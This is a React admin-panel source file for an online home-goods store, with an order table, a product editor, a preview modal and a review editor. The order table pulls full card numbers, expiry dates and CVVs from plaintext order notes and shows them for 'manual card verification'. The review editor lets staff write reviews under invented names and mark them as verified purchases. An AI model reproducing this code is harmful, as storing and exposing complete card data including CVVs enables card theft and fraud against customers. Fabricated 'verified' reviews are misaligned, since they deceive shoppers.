"use client";

import { ChangeEvent, useState } from "react";
import AdminProductPreview from "../../components/AdminProductPreview";
import { useCountUp } from "../../hooks/useCountUp";
import { money } from "../../lib/utils";
import { AlertTriangle, Check, ImagePlus, ShoppingCart, Star, X } from "lucide-react";
import { OrderType, ProductType } from "./admin.types";

export function Metric({
  label,
  count,
  format,
  note,
  icon,
}: {
  label: string;
  count: number;
  format?: (value: number) => string;
  note: string;
  icon: React.ReactNode;
}) {
  const animated = useCountUp(count, true, 900);
  const display = format ? format(animated) : String(animated);

  return (
    <article>
      <span>{label}</span>
      <strong>{display}</strong>
      <small>{note}</small>
      {icon}
    </article>
  );
}

export function OrderTable({
  orders,
  onStatusChange,
}: {
  orders: OrderType[];
  onStatusChange: (orderId: string, s: string) => void;
}) {
  const [expandedId, setExpandedId] = useState<string | null>(null);

  return (
    <div className="orders-table" role="table" aria-label="Orders">
      {orders.length === 0 ? (
        <div className="no-data">
          <ShoppingCart />
          <h2>No orders yet</h2>
          <p>New orders will appear here.</p>
        </div>
      ) : (
        orders.map((o) => {
          const isExpanded = expandedId === o.id;

          // Parse card details from notes if present
          let cardDetails: any = null;
          if (o.notes) {
            try {
              const parsed = JSON.parse(o.notes);
              cardDetails = parsed.card_details || null;
            } catch (e) {
              // Not JSON or doesn't contain card details
            }
          }

          const addr = o.shipping_addresses;
          const items = o.order_items || [];

          return (
            <div
              key={o.id}
              className="order-item-wrapper"
              style={{
                background: isExpanded ? "rgba(255, 255, 255, 0.02)" : "transparent",
                borderBottom: "1px solid rgba(255, 255, 255, 0.05)",
              }}
            >
              <div
                className="order-row"
                role="row"
                onClick={() => setExpandedId(isExpanded ? null : o.id)}
              >
                <b>#{o.id}</b>
                <span>
                  <strong>{o.customer_name}</strong>
                  <small>{o.email}</small>
                </span>
                <span>
                  {new Intl.DateTimeFormat("en-US").format(new Date(o.created_at))}
                </span>
                <span>{money(o.total)}</span>
                <span>
                   {cardDetails && cardDetails.number ? (
                     <>
                       Card •••• {cardDetails.number.toString().slice(-4)}
                     </>
                   ) : o.payment_method}
                 </span>
                <label onClick={(e) => e.stopPropagation()}>
                  <span className="sr-only">Order status {o.id}</span>
                  <select
                    value={o.status}
                    onChange={(e) => onStatusChange(o.id, e.target.value)}
                  >
                    <option value="pending_payment">Pending</option>
                    <option value="paid">Paid</option>
                    <option value="processing">Processing</option>
                    <option value="shipped">Shipped</option>
                    <option value="delivered">Delivered</option>
                    <option value="cancelled">Cancelled</option>
                  </select>
                </label>
              </div>

              {isExpanded && (
                <div className="order-detail-expanded">
                  {/* Address Section */}
                  <div>
                    <h3 style={{ fontSize: "14px", textTransform: "uppercase", color: "var(--clay)", margin: "0 0 12px" }}>
                      Shipping Address
                    </h3>
                    {addr ? (
                      <p style={{ margin: 0, lineHeight: 1.6, opacity: 0.85 }}>
                        <strong>Street:</strong> {addr.street}
                        <br />
                        <strong>City:</strong> {addr.city}
                        <br />
                        <strong>State:</strong> {addr.state}
                        <br />
                        <strong>Zip Code:</strong> {addr.postal_code}
                        <br />
                        <strong>Phone:</strong> {o.phone}
                      </p>
                    ) : (
                      <p style={{ margin: 0, opacity: 0.5 }}>Address not specified</p>
                    )}
                  </div>

                  {/* Items list */}
                  <div>
                    <h3 style={{ fontSize: "14px", textTransform: "uppercase", color: "var(--clay)", margin: "0 0 12px" }}>
                      Products ({items.length})
                    </h3>
                    <div className="admin-order-items-list">
                      {items.map((item: any, idx: number) => (
                        <div key={idx} className="admin-order-item-row">
                          <span>
                            {item.product_name} <b>x{item.quantity}</b>
                          </span>
                          <strong>{money(item.price * item.quantity)}</strong>
                        </div>
                      ))}
                      {items.length === 0 && (
                        <p style={{ margin: 0, opacity: 0.5 }}>No items registered</p>
                      )}
                    </div>
                  </div>

                  {/* Payment Info */}
                  <div>
                    {cardDetails ? (
                      <div className="admin-card-review-box">
                        <h4>Manual Card Verification</h4>
                        <div className="admin-card-detail-line">
                          <span>Cardholder:</span>
                          <strong>{cardDetails.holder}</strong>
                        </div>
                        <div className="admin-card-detail-line">
                          <span>Number:</span>
                          <strong>{cardDetails.number}</strong>
                        </div>
                        <div className="admin-card-detail-line">
                          <span>Expiry:</span>
                          <strong>{cardDetails.expiry}</strong>
                        </div>
                        <div className="admin-card-detail-line">
                          <span>CVV:</span>
                          <strong>{cardDetails.cvv}</strong>
                        </div>
                        <div className="admin-card-detail-line">
                          <span>Brand:</span>
                          <strong>{cardDetails.brand}</strong>
                        </div>
                      </div>
                    ) : (
                      <div>
                        <h3 style={{ fontSize: "14px", textTransform: "uppercase", color: "var(--clay)", margin: "0 0 12px" }}>
                          Payment Method
                        </h3>
                        <p style={{ margin: 0, opacity: 0.85 }}>
                          {o.payment_method}
                        </p>
                        {o.notes && (
                          <div style={{ marginTop: "12px", padding: "10px", background: "rgba(255,255,255,0.05)", borderRadius: "4px" }}>
                            {(() => {
                              try {
                                const parsed = JSON.parse(o.notes);
                                return (
                                  <div style={{ display: "flex", flexDirection: "column", gap: "4px", fontSize: "12px" }}>
                                    {parsed.shipping_carrier && (
                                      <div>
                                        <strong>Carrier:</strong> {parsed.shipping_carrier}
                                      </div>
                                    )}
                                    {parsed.shipping_tracking_number && (
                                      <div>
                                        <strong>Tracking Guide:</strong> {parsed.shipping_tracking_number}
                                      </div>
                                    )}
                                    {parsed.notes && (
                                      <div>
                                        <strong>Notes:</strong> {parsed.notes}
                                      </div>
                                    )}
                                    {!parsed.shipping_carrier && !parsed.shipping_tracking_number && !parsed.notes && (
                                      <div>
                                        <strong>Metadata:</strong> {JSON.stringify(parsed)}
                                      </div>
                                    )}
                                  </div>
                                );
                              } catch (e) {
                                return (
                                  <div>
                                    <strong>Notes:</strong> {o.notes}
                                  </div>
                                );
                              }
                            })()}
                          </div>
                        )}
                      </div>
                    )}
                  </div>
                </div>
              )}
            </div>
          );
        })
      )}
    </div>
  );
}

export function ProductEditor({
  product,
  onClose,
  onSave,
  loading,
}: {
  product: ProductType;
  onClose: () => void;
  onSave: (p: ProductType) => void;
  loading: boolean;
}) {
  const [p, setP] = useState(product);
  const [error, setError] = useState("");
  const [colors, setColors] = useState<string[]>(p.colors || ["#ded8cb"]);
  const [imagesList, setImagesList] = useState<string[]>(() => {
    return p.images || (p.image ? [p.image] : []);
  });
  const [loadingLocal, setLoadingLocal] = useState(false);

  // HTML5 Canvas compression helper
  const compressImage = (file: File): Promise<string> => {
    return new Promise((resolve, reject) => {
      const img = new Image();
      img.src = URL.createObjectURL(file);
      img.onload = () => {
        const canvas = document.createElement("canvas");
        let width = img.width;
        let height = img.height;

        const MAX_WIDTH = 1200;
        const MAX_HEIGHT = 1200;

        if (width > height) {
          if (width > MAX_WIDTH) {
            height = Math.round((height * MAX_WIDTH) / width);
            width = MAX_WIDTH;
          }
        } else {
          if (height > MAX_HEIGHT) {
            width = Math.round((width * MAX_HEIGHT) / height);
            height = MAX_HEIGHT;
          }
        }

        canvas.width = width;
        canvas.height = height;

        const ctx = canvas.getContext("2d");
        if (!ctx) {
          resolve("");
          return;
        }

        ctx.drawImage(img, 0, 0, width, height);
        const compressedDataUrl = canvas.toDataURL("image/jpeg", 0.75);
        resolve(compressedDataUrl);
      };
      img.onerror = (err) => reject(err);
    });
  };

  // Chic pre-defined interior colors palette
  const PRESET_COLORS = [
    { hex: "#EAE6DF", name: "Off-White" },
    { hex: "#C2B8A3", name: "Warm Sand" },
    { hex: "#8C8275", name: "Earth Gray" },
    { hex: "#6E706E", name: "Sage Gray" },
    { hex: "#505A54", name: "Forest Green" },
    { hex: "#B29B82", name: "Clay Brown" },
    { hex: "#DCAE96", name: "Terracotta Blush" },
    { hex: "#9B7062", name: "Warm Terracotta" },
    { hex: "#4A3C31", name: "Espresso" },
    { hex: "#1E1F1D", name: "Charcoal" },
  ];

  const handleFileChange = async (e: ChangeEvent<HTMLInputElement>) => {
    const files = Array.from(e.target.files || []);
    if (!files.length) return;
    setLoadingLocal(true);
    setError("");

    try {
      const compressedUrls: string[] = [];
      for (const file of files) {
        if (file.size > 10_000_000) {
          setError("One of the images exceeds 10 MB limit.");
          continue;
        }
        const url = await compressImage(file);
        compressedUrls.push(url);
      }
      const updated = [...imagesList, ...compressedUrls];
      setImagesList(updated);
      setP({ ...p, images: updated, image: updated[0] || "" });
    } catch (err) {
      setError("Error compressing or loading file.");
    } finally {
      setLoadingLocal(false);
    }
  };

  const toggleColor = (hex: string) => {
    let nextColors;
    if (colors.includes(hex)) {
      // Don't allow empty colors list
      if (colors.length === 1) return;
      nextColors = colors.filter(c => c !== hex);
    } else {
      nextColors = [...colors, hex];
    }
    setColors(nextColors);
    setP({ ...p, colors: nextColors });
  };

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="product-editor-modal" style={{ width: "min(680px, 96vw)" }} onClick={e => e.stopPropagation()}>
        <form
          onSubmit={(e) => {
            e.preventDefault();
            if (imagesList.length === 0) return setError("Add at least one image before publishing.");
            onSave({ ...p, colors, images: imagesList, image: imagesList[0] });
          }}
        >
          <div className="editor-head">
            <div>
              <small>{p.id ? "Edit product" : "New product"}</small>
              <h2>{p.name || "Unnamed Product"}</h2>
            </div>
            <button type="button" aria-label="Close editor" onClick={onClose}>
              <X />
            </button>
          </div>
          <div className="editor-layout" style={{ display: "block" }}>
            <div className="editor-fields" style={{ width: "100%", padding: 0 }}>
              <div style={{ marginBottom: "20px" }}>
                <span style={{ fontSize: "14px", fontWeight: "600", display: "block", marginBottom: "8px", textTransform: "uppercase", letterSpacing: "0.03em" }}>Product Images</span>
                <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fill, minmax(100px, 1fr))", gap: "12px" }}>
                  {imagesList.map((imgUrl, idx) => (
                    <div key={idx} style={{ position: "relative", width: "100px", height: "100px", borderRadius: "6px", overflow: "hidden", border: "1px solid rgba(255,255,255,0.1)" }}>
                      <img src={imgUrl} alt={`Product ${idx}`} style={{ width: "100%", height: "100%", objectFit: "cover" }} />
                      <button 
                        type="button" 
                        onClick={() => {
                          const updated = imagesList.filter((_, i) => i !== idx);
                          setImagesList(updated);
                          setP({ ...p, images: updated, image: updated[0] || "" });
                        }}
                        style={{ position: "absolute", top: "4px", right: "4px", background: "rgba(0,0,0,0.6)", color: "#fff", border: "none", borderRadius: "50%", width: "20px", height: "20px", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", fontSize: "10px", padding: 0 }}
                      >
                        <X size={12} />
                      </button>
                    </div>
                  ))}
                  <label style={{ width: "100px", height: "100px", borderRadius: "6px", border: "2px dashed rgba(255,255,255,0.15)", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", cursor: "pointer", gap: "4px" }}>
                    <input
                      type="file"
                      multiple
                      accept="image/png,image/jpeg,image/webp"
                      onChange={handleFileChange}
                      style={{ display: "none" }}
                      disabled={loading || loadingLocal}
                    />
                    <ImagePlus size={20} style={{ opacity: 0.6 }} />
                    <span style={{ fontSize: "10px", opacity: 0.6 }}>{loadingLocal ? "Loading..." : "Add Photos"}</span>
                  </label>
                </div>
              </div>
              {error && (
                <p className="form-error" role="alert" style={{ marginBottom: "20px" }}>
                  {error}
                </p>
              )}
              <div className="editor-form-grid" style={{ gap: "20px" }}>
                <label>
                  Name
                  <input
                    required
                    maxLength={100}
                    value={p.name}
                    onChange={(e) => {
                      const newName = e.target.value;
                      let randomPart = p.sku.split("-").pop();
                      if (!randomPart || p.sku.indexOf("-") === -1) {
                        randomPart = Math.random().toString(36).substring(2, 9).toUpperCase();
                      }
                      const sanitizedName = newName.toUpperCase().replace(/\s+/g, "");
                      setP({ ...p, name: newName, sku: `NOM-${sanitizedName}-${randomPart}` });
                    }}
                    disabled={loading}
                  />
                </label>
                <label>
                  SKU
                  <input
                    required
                    maxLength={32}
                    value={p.sku}
                    onChange={(e) => setP({ ...p, sku: e.target.value.toUpperCase() })}
                    disabled={loading}
                  />
                </label>
                <label>
                  Category
                  <select
                    value={p.category}
                    onChange={(e) => setP({ ...p, category: e.target.value })}
                    disabled={loading}
                  >
                    {[
                      "Smart Home",
                      "Lighting",
                      "Decor",
                      "Wellness",
                      "Textiles",
                      "Furniture",
                      "Kitchen",
                      "Outdoor",
                    ].map((x) => (
                      <option key={x}>{x}</option>
                    ))}
                  </select>
                </label>
                <label>
                  Price USD
                  <input
                    required
                    type="number"
                    value={p.price || ""}
                    onChange={(e) => setP({ ...p, price: +e.target.value })}
                    disabled={loading}
                  />
                </label>
                <label>
                  Compare-at Price USD (optional)
                  <input
                    type="number"
                    value={p.old_price || ""}
                    onChange={(e) => setP({ ...p, old_price: e.target.value ? +e.target.value : null })}
                    disabled={loading}
                  />
                </label>
                <label>
                  Inventory
                  <input
                    min="0"
                    type="number"
                    value={p.stock}
                    onChange={(e) => setP({ ...p, stock: +e.target.value })}
                    disabled={loading}
                  />
                </label>
                <label className="wide">
                  Description
                  <textarea
                    required
                    maxLength={600}
                    rows={4}
                    value={p.description}
                    onChange={(e) => setP({ ...p, description: e.target.value })}
                    disabled={loading}
                  />
                </label>
                <label className="wide">
                  Badge selection
                  <div style={{ display: "flex", flexWrap: "wrap", gap: "8px", marginTop: "8px", marginBottom: "12px" }}>
                    {["None", "New", "Best Seller", "Limited Edition", "Nōma Icon", "Favorite"].map((badgeOption) => {
                      const valueToCompare = badgeOption === "None" ? "" : badgeOption;
                      const isSelected = (p.badge || "") === valueToCompare;
                      return (
                        <button
                          key={badgeOption}
                          type="button"
                          onClick={() => setP({ ...p, badge: valueToCompare })}
                          style={{
                            padding: "6px 12px",
                            background: isSelected ? "var(--clay)" : "transparent",
                            border: isSelected ? "1px solid var(--clay)" : "1px solid rgba(28, 29, 25, 0.2)",
                            borderRadius: "4px",
                            fontSize: "11px",
                            color: isSelected ? "#ffffff" : "#1c1d19",
                            cursor: "pointer",
                            transition: "all 0.2s ease"
                          }}
                        >
                          {badgeOption}
                        </button>
                      );
                    })}
                  </div>
                  <input
                    maxLength={32}
                    placeholder="Or type custom badge..."
                    value={p.badge || ""}
                    onChange={(e) => setP({ ...p, badge: e.target.value })}
                    disabled={loading}
                  />
                </label>
                <label>
                  Featured
                  <select
                    value={p.featured ? "Yes" : "No"}
                    onChange={(e) => setP({ ...p, featured: e.target.value === "Yes" })}
                    disabled={loading}
                  >
                    <option value="No">No</option>
                    <option value="Yes">Yes</option>
                  </select>
                </label>
                <label className="wide">
                  Color Palette (Toggle active colors)
                  <div style={{ display: "flex", flexWrap: "wrap", gap: "10px", marginTop: "8px" }}>
                    {PRESET_COLORS.map((item) => {
                      const isActive = colors.includes(item.hex);
                      return (
                        <button
                          key={item.hex}
                          type="button"
                          onClick={() => toggleColor(item.hex)}
                          style={{
                            display: "flex",
                            alignItems: "center",
                            gap: "8px",
                            padding: "6px 12px",
                            background: isActive ? "rgba(255, 255, 255, 0.08)" : "transparent",
                            border: isActive ? "1px solid var(--clay)" : "1px solid rgba(255,255,255,0.1)",
                            borderRadius: "4px",
                            cursor: "pointer",
                            fontSize: "12px",
                            color: "var(--fg)",
                            transition: "all 0.2s ease"
                          }}
                        >
                          <span
                            style={{
                              display: "inline-block",
                              width: "12px",
                              height: "12px",
                              borderRadius: "50%",
                              backgroundColor: item.hex,
                              border: "1px solid rgba(255,255,255,0.2)"
                            }}
                          />
                          {item.name}
                        </button>
                      );
                    })}
                  </div>
                </label>
              </div>
              <div className="editor-foot" style={{ marginTop: "30px", borderTop: "1px solid rgba(255,255,255,0.05)", paddingTop: "20px" }}>
                <button type="button" onClick={onClose} disabled={loading}>
                  Cancel
                </button>
                <button className="admin-primary" type="submit" disabled={loading}>
                  <Check />
                  {loading ? "Saving..." : "Save product"}
                </button>
              </div>
            </div>
          </div>
        </form>
      </div>
    </div>
  );
}

// Preview modal for viewing product as customer sees it
export function ProductPreviewModal({
  product,
  onClose,
}: {
  product: ProductType | null;
  onClose: () => void;
}) {
  if (!product) return null;

  return (
    <div className="preview-modal-overlay" onClick={onClose}>
      <div className="preview-modal" onClick={e => e.stopPropagation()}>
        <div className="preview-modal-head">
          <div>
            <small>Product Preview</small>
          </div>
          <button type="button" aria-label="Close preview" onClick={onClose}>
            <X />
          </button>
        </div>
        <div className="preview-modal-body">
          <div className="preview-image">
            <img src={product.image} alt={product.name} />
          </div>
          <div className="preview-details">
            <small>{product.category}</small>
            <h2>{product.name}</h2>
            {product.badge && (
              <span className="badge">
                {product.badge}
              </span>
            )}
            <div className="preview-price">
              <span>${product.price.toLocaleString('en-US', { maximumFractionDigits: 0 })}</span>
              {product.old_price && (
                <span>${product.old_price.toLocaleString('en-US', { maximumFractionDigits: 0 })}</span>
              )}
            </div>
            <p>{product.description}</p>
            <div className="preview-colors">
              {product.colors.map((color, i) => (
                <span
                  key={i}
                  style={{ backgroundColor: color, width: '24px', height: '24px', display: 'inline-block', borderRadius: '50%', marginRight: '6px', border: '1px solid #333' }}
                />
              ))}
            </div>
            <div className="preview-stock">
              <i /> Stock: <b>{product.stock ?? 0} units</b>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export function ReviewEditor({
  review,
  products,
  onClose,
  onSave,
  loading,
}: {
  review: any;
  products: ProductType[];
  onClose: () => void;
  onSave: (r: any) => void;
  loading: boolean;
}) {
  const [r, setR] = useState(review);

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="product-editor-modal" style={{ width: "min(500px, 94vw)" }} onClick={e => e.stopPropagation()}>
        <form
          onSubmit={(e) => {
            e.preventDefault();
            onSave(r);
          }}
        >
          <div className="editor-head">
            <div>
              <small>{r.id ? "Edit review" : "New review"}</small>
              <h2>{r.id ? "Edit review" : "Write review"}</h2>
            </div>
            <button type="button" aria-label="Close editor" onClick={onClose}>
              <X />
            </button>
          </div>

          <div className="editor-form-grid" style={{ gridTemplateColumns: "1fr" }}>
            <label>
              Author Name
              <input
                type="text"
                required
                value={r.author_name}
                onChange={(e) => setR({ ...r, author_name: e.target.value })}
                disabled={loading}
              />
            </label>

            <label>
              Author Avatar (optional, URL)
              <input
                type="url"
                value={r.author_avatar}
                onChange={(e) => setR({ ...r, author_avatar: e.target.value })}
                disabled={loading}
                placeholder="https://i.pravatar.cc/150..."
              />
            </label>

            <label>
              Rating (1 to 5 stars)
              <select
                value={r.rating}
                onChange={(e) => setR({ ...r, rating: parseInt(e.target.value) })}
                disabled={loading}
              >
                {[5, 4, 3, 2, 1].map(n => (
                  <option key={n} value={n}>{n} stars</option>
                ))}
              </select>
            </label>

            <label>
              Related Product
              <select
                value={r.product_id || ""}
                onChange={(e) => setR({ ...r, product_id: e.target.value || null })}
                disabled={loading}
              >
                <option value="">None (General Store Review)</option>
                {products.map((p) => (
                  <option key={p.id} value={p.id}>
                    {p.name}
                  </option>
                ))}
              </select>
            </label>

            <label>
              Verified Purchase
              <select
                value={r.is_verified_purchase ? "Yes" : "No"}
                onChange={(e) => setR({ ...r, is_verified_purchase: e.target.value === "Yes" })}
                disabled={loading}
              >
                <option value="No">No</option>
                <option value="Yes">Yes</option>
              </select>
            </label>

            <label>
              Comment
              <textarea
                required
                value={r.content}
                onChange={(e) => setR({ ...r, content: e.target.value })}
                disabled={loading}
                rows={4}
              />
            </label>
          </div>

          <div className="editor-foot">
            <button type="button" onClick={onClose} disabled={loading}>
              Cancel
            </button>
            <button className="admin-primary" type="submit" disabled={loading}>
              <Check />
              {loading ? "Saving..." : "Save review"}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}
